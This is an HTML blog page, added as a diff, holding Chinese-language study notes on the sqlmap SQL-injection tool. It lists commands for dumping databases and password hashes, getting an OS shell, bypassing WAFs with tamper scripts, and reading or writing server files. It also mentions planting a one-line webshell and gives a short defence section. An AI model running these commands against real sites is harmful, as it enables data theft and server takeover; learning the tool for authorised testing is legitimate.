@@ -1,0 +1,416 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    Hexo
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="miccall" />
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">MICCALL</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/about/" title="简历">
+		                简历
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/group/" title="团队">
+		                团队
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/miccall" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
+                            <i class="icon fa fa-500px"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >SQLmap笔记</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h1 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h1><h2 id="SQLmap的介绍"><a href="#SQLmap的介绍" class="headerlink" title="SQLmap的介绍"></a>SQLmap的介绍</h2><p>sqlmap是一个开源的渗透测试工具，它自动化了检测和利用SQL注入缺陷以及接管数据库服务器的过程</p>
+<h2 id="SQLmap支持六种注入方式"><a href="#SQLmap支持六种注入方式" class="headerlink" title="SQLmap支持六种注入方式"></a>SQLmap支持六种注入方式</h2><p>SQL盲注、联合注入、报错注入、堆叠注入、盲推理注入、时间盲注</p>
+<h2 id="使用SQLmap得出数据库信息的基本流程"><a href="#使用SQLmap得出数据库信息的基本流程" class="headerlink" title="使用SQLmap得出数据库信息的基本流程"></a>使用SQLmap得出数据库信息的基本流程</h2><p>1.检查是否存在注入点</p>
+<p>sqlmap -u  “URL”</p>
+<p>参数：-u #<strong>目标URL</strong></p>
+<p>2.查看所有数据库</p>
+<p>sqlmap -u “URL” –dbs</p>
+<p>参数：-u #<strong>目标URL</strong>、–dbs #<strong>所有数据库</strong></p>
+<p>3.查看当前使用的数据库</p>
+<p>sqlmap -u “URL” –current-db</p>
+<p>参数：-u #<strong>目标URL</strong>、–current-db #<strong>查看网站当前的数据库</strong></p>
+<p>4.查看表名</p>
+<p>sqlmap -u “URL” -D security –tables</p>
+<p>参数：-u #<strong>目标URL</strong>、-D #<strong>指定数据库</strong>、–tables #<strong>列出表名</strong></p>
+<p>5.列出所有字段名</p>
+<p>sqlmap -u “URL” -D security -T users –columns</p>
+<p>参数：-u#<strong>目标URL</strong>、-D #<strong>指定数据库</strong>、-T #<strong>指定表名</strong>、–columns #<strong>列出所有的字段名</strong></p>
+<p>6.列出字段内容（数据）</p>
+<p>参数：-u#<strong>目标URL</strong>、-D #<strong>指定数据库</strong>、-T #<strong>指定表名</strong>、-C #<strong>指定字段</strong>、–dump #<strong>列出字段内容，转存数据</strong></p>
+<h2 id="SQLmap常用参数"><a href="#SQLmap常用参数" class="headerlink" title="SQLmap常用参数"></a>SQLmap常用参数</h2><h3 id="输出级别参数"><a href="#输出级别参数" class="headerlink" title="输出级别参数"></a>输出级别参数</h3><p>参数：-v</p>
+<p>使用方法：-v &lt;级别&gt; 如：sqlmap -u “URL” -v 3</p>
+<p>参数详情：SQLmap的输出信息<strong>从简到繁</strong>，从<strong>0-6</strong>共分为<strong>7</strong>个级别，默认输出级别为1</p>
+<p>各个输出级别的描述如下：</p>
+<p>0：只显示python的回溯、错误和关键信息</p>
+<p>1:显示信息和警告消息</p>
+<p>2∶显示调式信息</p>
+<p>3∶显示注入使用的攻击载荷</p>
+<p>4∶显示HTTP请求</p>
+<p>5∶显示HTTP响应头</p>
+<p>6∶显示HTTP相应页面的内容</p>
+<h3 id="测试注入点权限"><a href="#测试注入点权限" class="headerlink" title="测试注入点权限"></a>测试注入点权限</h3><p>参数：–privileges</p>
+<p>用法：</p>
+<p>sqlmap -u URL –privileges &#x2F;&#x2F;测试所有用户的权限</p>
+<p>sqlmap -u URL –privileges -U sa &#x2F;&#x2F;测试sa用户的权限</p>
+<p>注：若目标是MSSql数据库、这一参数会列出每个用户是否是管理员而不列出每个用户的具体权限</p>
+<h3 id="执行shell命令"><a href="#执行shell命令" class="headerlink" title="执行shell命令"></a>执行shell命令</h3><p>参数：-os-cmd&#x2F;-os-shell</p>
+<p>用法：</p>
+<p>sqlmap -u URL –os-cmd&#x3D;“net user” &#x2F;&#x2F;执行net user命令</p>
+<p>sqlmap -u URL –os-shell &#x2F;&#x2F;系统交互式的shell</p>
+<p>注：</p>
+<p>1.需要有权限使用特定函数</p>
+<p>2.数据库为mysql、postgresql和sqlserver</p>
+<h3 id="POST提交方式"><a href="#POST提交方式" class="headerlink" title="POST提交方式"></a>POST提交方式</h3><p>参数：</p>
+<p>1.-data &#x2F;&#x2F;通过post方式提交参数</p>
+<p>2.-r txt文件 &#x2F;&#x2F;读取文件中的HTTP数据包内容用来测试POST注入和HTTP Header注入</p>
+<p>用法：</p>
+<p>sqlmap -u URL –data “POST参数”</p>
+<p>sqlmap -u URL -r “.TXT文件”</p>
+<h3 id="获取数据库的用户名和密码"><a href="#获取数据库的用户名和密码" class="headerlink" title="获取数据库的用户名和密码"></a>获取数据库的用户名和密码</h3><p>参数：</p>
+<p>1.-users &#x2F;&#x2F;枚举所有的用户</p>
+<p>2.-passwords &#x2F;&#x2F;枚举所有的用户密码</p>
+<p>用法：</p>
+<p>sqlmap -u URL –users -passwords</p>
+<h3 id="tamper参数"><a href="#tamper参数" class="headerlink" title="tamper参数"></a>tamper参数</h3><p>作用：</p>
+<p>·tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf</p>
+<p>·使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击</p>
+<p>用法：</p>
+<p>sqlmap -u URL –tamper&#x3D;TAMPER &#x2F;&#x2F;利用给定的脚本进行篡改注入数据</p>
+<p>tamper的结构:</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/SQLmap/tamper%E7%BB%93%E6%9E%84.png" alt="tamper结构"></p>
+<h2 id="SQLmap深入理解"><a href="#SQLmap深入理解" class="headerlink" title="SQLmap深入理解"></a>SQLmap深入理解</h2><h3 id="探测等级"><a href="#探测等级" class="headerlink" title="探测等级"></a>探测等级</h3><p>参数：–level</p>
+<p>用法：sqlmap -u URL –level 3</p>
+<p>说明:SQLMap一共有5个探测等级，默认是1，SQLMap使用的Payload可以在xml&#x2F;payloads.xml中看到，也可以根据相应的格式添加自己的payload。</p>
+<p>level 1 : 对GET和POST的数据进行测试</p>
+<p>level 2:会对HTTP cookie进行测试</p>
+<p>level 3:会对HTTP User-Agent&#x2F;Referer头进行测试</p>
+<p>level4-5:测试的更加全面，同时测试的速度会更慢</p>
+<p>注意∶在不确定哪个Payload或参数为注入点时，为了保证全面性，建议使用高的level值</p>
+<h3 id="判断当前用户是否为管理员权限"><a href="#判断当前用户是否为管理员权限" class="headerlink" title="判断当前用户是否为管理员权限"></a>判断当前用户是否为管理员权限</h3><p>参数：–is-dba</p>
+<p>用法：sqlmap -u URL –is-dba</p>
+<p>结果：若是管理员会返回Ture，否则返回False</p>
+<h3 id="列出数据库管理员角色"><a href="#列出数据库管理员角色" class="headerlink" title="列出数据库管理员角色"></a>列出数据库管理员角色</h3><p>参数：–roles</p>
+<p>用法：sqlmap -u URL –roles</p>
+<p>注：还可以使用-U参数指定想看哪个用户的角色</p>
+<h3 id="列举数据库管理系统信息"><a href="#列举数据库管理系统信息" class="headerlink" title="列举数据库管理系统信息"></a>列举数据库管理系统信息</h3><p>参数：-b或–banner</p>
+<p>用法：sqlmap -u URL –banner</p>
+<p>说明:返回数据库管理系统的版本号和最后的补丁级别以及底层的操作系统信息</p>
+<h2 id="SQLmap的HTTP头部注入"><a href="#SQLmap的HTTP头部注入" class="headerlink" title="SQLmap的HTTP头部注入"></a>SQLmap的HTTP头部注入</h2><h3 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h3><p>参数：-method</p>
+<p>用法：sqlmap -u URL -method “PUT”</p>
+<p>注：一般来说，Sqlmap能自动判断出是使用GET方法还是POST方法，但在某些情况下需要的可能是PUT等很少见的方法，此时就需要用参数“-method”来指定方法</p>
+<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>参数：–cookie</p>
+<p>用法：sqlmap -u URL –cookie&#x3D;“SESSIONID&#x3D;xxxxx;NAME&#x3D;ichunqiu;” –level 2 –data “”</p>
+<p>注︰当需要对cookie注入的时候，必须使用–cookie选项,–data “”因为post的数据长度为0，但是又想使用post方法进行注入，则使用–data “”，使用–data选项后，sqlmap自动使用post方法</p>
+<p>说明∶<br>1.sqlmap不支持使用–method指定http请求的方法</p>
+<p>2.默认不扫cookie的内容，必须是level大于等于2才能扫cookie里的内容</p>
+<p>3.cookie默认的分隔符为“;”</p>
+<h3 id="User-Agent注入"><a href="#User-Agent注入" class="headerlink" title="User-Agent注入"></a>User-Agent注入</h3><p>参数：-user-agent和-random-agent</p>
+<p>用法:–user-agent&#x3D;”Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko&#x2F;20100101 Firefox&#x2F;16.0”</p>
+<p>注:”-user-agent”可以指定一个User-Agent值，参数“-random-agent”，Sqlmap会从文件.&#x2F;txt&#x2F;user-agents.txt中随机地取一个User-Agent</p>
+<p>说明：</p>
+<p>1.在一次会话中只有使用同一个User-Agent，并不是每发一个HTTP请求包，都随机一个User-Agent</p>
+<p>2.必须是level大于等于3才会尝试对referer,注入</p>
+<h3 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h3><p>参数：-referer</p>
+<p>用法：-referer&#x3D;“aaa”</p>
+<p>说明：使用sqlmap可以在请求中伪造HTTP中的referer ，Sqlmap发送的HTTP请求头部默认无Referer字段</p>
+<p>注意∶必须是level大于等于3才会尝试对 referer注入</p>
+<h2 id="SQLmap执行SQL语句"><a href="#SQLmap执行SQL语句" class="headerlink" title="SQLmap执行SQL语句"></a>SQLmap执行SQL语句</h2><h3 id="交互式的SQL命令行"><a href="#交互式的SQL命令行" class="headerlink" title="交互式的SQL命令行"></a>交互式的SQL命令行</h3><p>参数：–sql-shell</p>
+<p>用法：sqlmap -u URL –sql-shell</p>
+<p>注：该参数可直接获得交互式的SQL命令shell，我们可以在此直接输入想要执行的SQL语句并实时取得回显，输入x或者q退出交互式命令行</p>
+<h3 id="执行指定SQL语句"><a href="#执行指定SQL语句" class="headerlink" title="执行指定SQL语句"></a>执行指定SQL语句</h3><p>参数：–sql-query</p>
+<p>用法：sqlmap -u URL –sql-query&#x3D;“sql语句” sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.1.1.136/vulnerabilities/sqli/?id=1">http://10.1.1.136/vulnerabilities/sqli/?id=1</a> –sql-query “select user(),version(),database()”</p>
+<p>说明：该命令直接执行指定的SQL语句</p>
+<p>注：执行一次都会对网站注入一遍，比–sql-shell效率低</p>
+<h2 id="SQLmap的文件操作"><a href="#SQLmap的文件操作" class="headerlink" title="SQLmap的文件操作"></a>SQLmap的文件操作</h2><h3 id="了解SQL注入可以进行文件读写操作带来的危害"><a href="#了解SQL注入可以进行文件读写操作带来的危害" class="headerlink" title="了解SQL注入可以进行文件读写操作带来的危害"></a>了解SQL注入可以进行文件读写操作带来的危害</h3><p>如果当前web页面存在SQL注入漏洞，且当前的用户是root权限，且可以进行文件读写操作</p>
+<p>我们可以在知道绝对路径的情况下，尝试上传一个一句话木马，并用菜刀连接后，获取到网站的getshell</p>
+<h3 id="SQL注入导致的文件读写的防御方法"><a href="#SQL注入导致的文件读写的防御方法" class="headerlink" title="SQL注入导致的文件读写的防御方法"></a>SQL注入导致的文件读写的防御方法</h3><p>1.将secure-file-priv的参数在my.ini中配置为secure-file-priv&#x3D;null将会限制mysqld不允许导入导出操作secure-file-priv的配置，可以通过语句: select @@secure..file.priv查询</p>
+<p>2．在用户输入可控参数时，对敏感语句进行过滤</p>
+<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>参数:–file-read</p>
+<p>用法: sqlmap -u URL –file-read “文件绝对路径”</p>
+<p>说明:该命令用于读取执行文件，读取的文件可以是文本，也可以是二进制文件原理:利用mysql的load_file函数如:load_file(‘c:&#x2F;windows&#x2F;win.ini’)</p>
+<p>条件:</p>
+<blockquote>
+<p>文件必须在服务器上</p>
+</blockquote>
+<blockquote>
+<p>已知绝对路径</p>
+</blockquote>
+<blockquote>
+<p>具有读文件权限查询语句[select File_priv from mysqL.user where user&#x3D;”root” and host&#x3D;”localhost”]</p>
+</blockquote>
+<blockquote>
+<p>具有特定的函数执行特权，一般要求root</p>
+</blockquote>
+<blockquote>
+<p>数据库为mysql、postgresql和sqlserver</p>
+</blockquote>
+<blockquote>
+<p>max_allowed_packed &#x2F;&#x2F;读写文件最大的字节数</p>
+</blockquote>
+<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>参数:–file-write –file-dest</p>
+<p>用法:sqlmap -u URL –file-write “写入本地文件的地址”–file-dest “要写入的文件绝对路径”</p>
+<p>说明：该命令用于写入本地文件到服务器中，上传的文件可以是文本，也可以是二进制文件</p>
+<p>原理︰利用mysql的into outfile函数 如: union select 1,2, ‘aaa’ into outfile ‘C:\\phpstudy_pro\\www\\test1.txt’</p>
+<p>条件:</p>
+<blockquote>
+<p>1.文件必须在服务器上</p>
+</blockquote>
+<blockquote>
+<p>2.已知绝对路径</p>
+</blockquote>
+<blockquote>
+<p>3.有写文件权限（secure-file-priv是否被禁用，是否有目录权限等等）</p>
+</blockquote>
+<blockquote>
+<p>4.必须能绕过单引号过滤</p>
+</blockquote>
+<blockquote>
+<p>5.具有特定的函数执行特权，一般要求root</p>
+</blockquote>
+<blockquote>
+<p>6.数据库为mysql、postgresql和sqlserver</p>
+</blockquote>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://example.com/2022/03/29/SQLmap/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://example.com/2022/03/29/SQLmap/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//http-miccall-tech.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a target="_blank" rel="noopener" href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
